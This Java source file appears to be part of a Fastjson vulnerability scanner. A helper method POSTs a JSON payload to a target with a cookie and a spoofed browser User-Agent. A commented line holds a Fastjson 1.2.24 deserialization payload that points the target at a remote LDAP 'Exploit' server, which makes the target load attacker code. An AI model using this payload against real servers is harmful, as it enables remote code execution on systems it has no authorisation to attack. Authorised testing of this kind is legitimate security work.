package com.forger.fastJsonScan;

import java.io.IOException;

import org.apache.http.client.ResponseHandler;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

public class fastJsonScan {
    public static void main(String[] args) throws Exception {
        //String url = "http://172.16.10.130:8080/fastjson-1.2.24/";
        //String urlParmes = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://111.229.223.50:1389/Exploit\", \"autoCommit\":true}";

        //fastJsonScan fastJsonScan = new fastJsonScan();
        //System.out.println("\nTesting 2 - Send Http POST request");
        //System.out.println(urlParmes);
        //fastJsonScan.sendPost(url, urlParmes);
    }

    // HTTP POST请求
    public static String sendPost(String url, String fsPayload, String Cookie) {
        String returnValue = "Server 500 or not response! May be success!";
        CloseableHttpClient httpClient = HttpClients.createDefault();
        ResponseHandler<String> responseHandler = new BasicResponseHandler();
        try{
            //创建HttpClient对象
            httpClient = HttpClients.createDefault();
            //创建httpPost对象
            HttpPost httpPost = new HttpPost(url);
            //第三步：给httpPost设置JSON格式的参数
            StringEntity requestEntity = new StringEntity(fsPayload,"utf-8");
            requestEntity.setContentEncoding("UTF-8");
            httpPost.setHeader("Content-type", "application/json");
            httpPost.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");
            httpPost.setHeader("cookie", Cookie);
            httpPost.setEntity(requestEntity);
            //发送HttpPost请求，获取返回值
            returnValue = httpClient.execute(httpPost,responseHandler); //调接口获取返回值时，必须用此方法
        }
        catch(Exception e)
        {
            e.printStackTrace();
        }

        finally {
            try {
                httpClient.close();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
        //处理返回值
        return returnValue;
    }

}